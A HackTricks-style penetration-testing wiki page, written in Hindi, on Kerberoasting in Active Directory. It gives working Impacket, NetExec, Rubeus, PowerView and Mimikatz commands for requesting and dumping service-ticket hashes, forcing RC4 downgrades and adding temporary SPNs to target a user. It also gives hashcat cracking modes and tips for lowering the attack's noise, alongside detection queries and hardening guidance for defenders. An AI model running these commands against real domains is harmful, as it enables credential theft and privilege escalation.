# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting का ध्यान TGS tickets हासिल करने पर होता है, खास तौर पर Active Directory (AD) में user accounts के अंतर्गत चलने वाली services से जुड़े tickets पर; इसमें computer accounts शामिल नहीं होते। इन tickets को encrypt करने के लिए user passwords से प्राप्त keys का इस्तेमाल होता है, जिससे credentials को offline crack किया जा सकता है। किसी service के लिए user account के इस्तेमाल का संकेत non-empty ServicePrincipalName (SPN) property से मिलता है।

कोई भी authenticated domain user TGS tickets का अनुरोध कर सकता है, इसलिए किसी विशेष privilege की ज़रूरत नहीं होती।<sup>[[4]](#references)[[5]](#references)</sup>

### मुख्य बिंदु

- उन services के TGS tickets को निशाना बनाता है जो user accounts के अंतर्गत चलती हैं (यानी, जिन accounts पर SPN set है; computer accounts नहीं)।
- Tickets को service account के password से निकली key से encrypt किया जाता है और उन्हें offline crack किया जा सकता है।
- किसी elevated privilege की ज़रूरत नहीं; कोई भी authenticated account TGS tickets का अनुरोध कर सकता है।

> [!WARNING]
> ज़्यादातर public tools RC4-HMAC (etype 23) service tickets का अनुरोध करना पसंद करते हैं, क्योंकि इन्हें AES की तुलना में तेज़ी से crack किया जा सकता है। RC4 TGS hashes `$krb5tgs$23$*` से, AES128 `$krb5tgs$17$*` से और AES256 `$krb5tgs$18$*` से शुरू होते हैं। हालांकि, कई environments अब केवल AES का इस्तेमाल कर रहे हैं। यह न मानें कि केवल RC4 ही प्रासंगिक है।
> “spray-and-pray” roasting से भी बचें। Rubeus का default kerberoast सभी SPNs के लिए query कर सकता है और tickets का अनुरोध कर सकता है, जिससे बहुत शोर होता है। पहले enumeration करें और फिर दिलचस्प principals को निशाना बनाएं।

### Service account secrets और Kerberos crypto की लागत

कई services अब भी user accounts के अंतर्गत ऐसे passwords के साथ चलती हैं जिन्हें manually manage किया जाता है। KDC उन passwords से निकली keys के साथ service tickets को encrypt करता है और ciphertext किसी भी authenticated principal को दे देता है। इसलिए kerberoasting से बिना lockouts या DC telemetry के, offline guesses की कोई सीमा नहीं रहती। Encryption mode से cracking का खर्च तय होता है:

| Mode | Key derivation | Encryption type | अनुमानित RTX 5090 throughput* | Notes |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | 4,096 iterations और domain + SPN से generate किए गए per-principal salt के साथ PBKDF2-HMAC-SHA1 | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Salt rainbow tables को रोकता है, लेकिन छोटे passwords की तेज़ cracking फिर भी संभव है। |
| RC4 + NT hash | Password का एकल MD4 (बिना salt वाला NT hash); Kerberos हर ticket में केवल 8-byte confounder मिलाता है | etype 23 (`$krb5tgs$23$`) | ~4.18 **billion** guesses/s | AES से ~1000× तेज़; जब भी `msDS-SupportedEncryptionTypes` इसकी अनुमति देता है, attackers RC4 को force करते हैं। |

*Benchmarks, [Matthew Green के Kerberoasting विश्लेषण](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/) में उद्धृत Chick3nman से लिए गए हैं।<sup>[[3]](#references)</sup>

RC4 का confounder केवल keystream को randomize करता है; यह हर guess के लिए अतिरिक्त computation नहीं जोड़ता। जब तक service accounts random secrets (gMSA/dMSA, machine accounts या vault-managed strings) पर निर्भर नहीं होते, compromise की गति पूरी तरह GPU budget पर निर्भर करती है। केवल AES etypes लागू करने से billion-guesses-per-second वाला downgrade हट जाता है, लेकिन कमज़ोर human passwords अब भी PBKDF2 के सामने टिक नहीं पाते।<sup>[[3]](#references)</sup>

### Attack

#### Linux

NetExec से roastable tickets का अनुरोध करने और Hashcat से उन्हें crack करने का एक व्यावहारिक end-to-end उदाहरण reference [1] में उपलब्ध है।<sup>[[1]](#references)</sup>

```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```

Kerberoast जाँच सहित बहु-सुविधा वाले tools:

```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```

#### Windows

- kerberoastable users की enumeration करें

```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```

- Technique 1: TGS के लिए अनुरोध करें और memory से dump करें

```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```

- Technique 2: Automatic tools

```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```

> [!WARNING]
> TGS अनुरोध से Windows Security Event 4769 जनरेट होता है (Kerberos service ticket का अनुरोध किया गया)।

### OPSEC और केवल-AES वाले वातावरण

- AES के बिना वाले accounts के लिए जानबूझकर RC4 का अनुरोध करें:
  - Rubeus: `/rc4opsec` AES के बिना वाले accounts को enumerate करने के लिए tgtdeleg का उपयोग करता है और RC4 service tickets का अनुरोध करता है।
  - Rubeus: kerberoast के साथ `/tgtdeleg` का उपयोग करने पर, जहाँ संभव हो, RC4 अनुरोध भी होते हैं।<sup>[[6]](#references)</sup>
- AES-only accounts को roast करें, ताकि प्रक्रिया बिना सूचना दिए विफल न हो:
  - Rubeus: `/aes` AES enabled वाले accounts को enumerate करता है और AES service tickets (etype 17/18) का अनुरोध करता है।
  - यदि आपके पास पहले से TGT है (PTT से या किसी .kirbi से), तो LDAP को छोड़कर `/ticket:<blob|path>` के साथ `/spn:<SPN>` या `/spns:<file>` का उपयोग कर सकते हैं।
- Targeting, throttling और कम शोर:
  - `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` और `/jitter:<1-100>` का उपयोग करें।
  - कमजोर passwords की संभावना वाले accounts को `/pwdsetbefore:<MM-dd-yyyy>` (पुराने passwords) से filter करें या `/ou:<DN>` से privileged OUs को target करें।<sup>[[8]](#references)</sup>

उदाहरण (Rubeus):

```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```

### Cracking

```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```

### दृढ़ता / दुरुपयोग

यदि आपका किसी account पर नियंत्रण है या आप उसमें बदलाव कर सकते हैं, तो SPN जोड़कर उसे kerberoastable बना सकते हैं:

```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```

आसान cracking के लिए किसी account को downgrade करके RC4 सक्षम करें (इसके लिए target object पर write privileges होना आवश्यक है):

```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```

#### किसी user पर GenericWrite/GenericAll के ज़रिए Targeted Kerberoast (अस्थायी SPN)

जब BloodHound दिखाता है कि आपके पास किसी user object पर नियंत्रण है (जैसे, GenericWrite/GenericAll), तो आप उस विशिष्ट user को भरोसेमंद तरीके से “targeted-roast” कर सकते हैं, भले ही उसके पास अभी कोई SPN न हो:<sup>[[9]](#references)</sup>

- नियंत्रित user में एक अस्थायी SPN जोड़ें, ताकि उसे roast किया जा सके।
- cracking को प्राथमिकता देने के लिए उस SPN के लिए RC4 (etype 23) से encrypted TGS-REP माँगें।
- `$krb5tgs$23$...` hash को hashcat से crack करें।
- footprint कम करने के लिए SPN हटा दें।

Windows (PowerView/Rubeus):

```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```

Linux one-liner (targetedKerberoast.py SPN जोड़ने -> TGS (etype 23) का अनुरोध करने -> SPN हटाने की प्रक्रिया को automates करता है):<sup>[[2]](#references)</sup>

```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```

hashcat autodetect से output को crack करें (`$krb5tgs$23$` के लिए mode 13100):

```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```

डिटेक्शन नोट्स: SPNs जोड़ने/हटाने से directory में बदलाव होते हैं (लक्षित user पर Event ID 5136/4738), और TGS अनुरोध से Event ID 4769 जनरेट होता है। अनुरोधों की गति सीमित रखें और तुरंत सफ़ाई करें।

Kerberoast attacks के लिए उपयोगी tools यहाँ मिल सकते हैं: https://github.com/nidem/kerberoast

अगर Linux पर यह error मिले: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`, तो इसकी वजह local time skew है। DC के साथ समय sync करें:

- `ntpdate <DC_IP>` (कुछ distros पर deprecated)
- `rdate -n <DC_IP>`

### domain account के बिना Kerberoast (AS-requested STs)

सितंबर 2022 में, Charlie Clark ने दिखाया कि अगर किसी principal के लिए pre-authentication आवश्यक नहीं है, तो request body में sname बदलकर crafted KRB_AS_REQ के ज़रिए service ticket प्राप्त करना संभव है। इससे TGT के बजाय service ticket मिलता है। यह AS-REP roasting जैसा है और इसके लिए valid domain credentials की आवश्यकता नहीं होती।

विवरण देखें: Semperis की write-up “New Attack Paths: AS-requested STs”.<sup>[[10]](#references)</sup>

> [!WARNING]
> आपको users की सूची देनी होगी, क्योंकि valid credentials के बिना इस technique से LDAP query नहीं की जा सकती।

Linux

- Impacket (PR #1413):

```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```

Windows

- Rubeus (PR #139):

```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```

संबंधित

यदि आप AS-REP roastable users को target कर रहे हैं, तो यह भी देखें:

{{#ref}}
asreproast.md
{{#endref}}

### पहचान

Kerberoasting stealthy हो सकता है। DCs से Event ID 4769 की तलाश करें और noise कम करने के लिए filters लागू करें:

- Service name `krbtgt` और `$` पर खत्म होने वाले service names (computer accounts) को बाहर रखें।
- Machine accounts (`*$$@*`) से आए requests को बाहर रखें।
- केवल सफल requests (`Failure Code` `0x0`) लें।
- Encryption types पर नज़र रखें: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`)। केवल `0x17` पर alert न करें।

PowerShell triage का उदाहरण:

```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
  Where-Object {
    ($_.Message -notmatch 'krbtgt') -and
    ($_.Message -notmatch '\$$') -and
    ($_.Message -match 'Failure Code:\s+0x0') -and
    ($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
    ($_.Message -notmatch '\$@')
  } |
  Select-Object -ExpandProperty Message
```

अतिरिक्त विचार:

- हर host/user के लिए सामान्य SPN उपयोग का baseline तय करें; किसी एक principal से बड़ी संख्या में अलग-अलग SPN requests आने पर alert करें।
- AES-hardened domains में असामान्य RC4 उपयोग को flag करें।

### Mitigation / Hardening

- Services के लिए gMSA/dMSA या machine accounts का उपयोग करें। Managed accounts में 120+ अक्षरों के random passwords होते हैं और वे अपने-आप rotate होते हैं, जिससे offline cracking व्यावहारिक नहीं रहती।<sup>[[7]](#references)</sup>
- Service accounts पर `msDS-SupportedEncryptionTypes` को केवल AES पर सेट करके AES लागू करें (decimal 24 / hex 0x18), फिर password rotate करें ताकि AES keys derive हों।<sup>[[7]](#references)</sup>
- जहाँ संभव हो, अपने environment में RC4 disable करें और RC4 उपयोग के प्रयासों की निगरानी करें। DCs पर, उन accounts के लिए defaults तय करने हेतु `DefaultDomainSupportedEncTypes` registry value का उपयोग कर सकते हैं जिनमें `msDS-SupportedEncryptionTypes` सेट नहीं है। अच्छी तरह परीक्षण करें।
- User accounts से अनावश्यक SPNs हटाएँ।<sup>[[7]](#references)</sup>
- यदि managed accounts का उपयोग संभव न हो, तो लंबे, random service account passwords (25+ chars) रखें; आम passwords पर रोक लगाएँ और नियमित रूप से audit करें।<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – व्यवहार में NetExec LDAP kerberoast + hashcat cracking](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: Legacy Kerberos Crypto से होने वाले कम-तकनीकी, बड़े प्रभाव वाले हमले (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): Kerberos पर हमला कैसे करें?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Active Directory Kerberos Abuse: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: AES enabled होने पर RC4 encrypted TGS का अनुरोध करना](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – Kerberoasting को कम करने में मदद के लिए Microsoft के दिशानिर्देश](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – Rubeus kerberoast command का documentation](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync से DA तक](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – नए Attack Paths? AS Requested Service Tickets (Charlie Clark, Sept 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
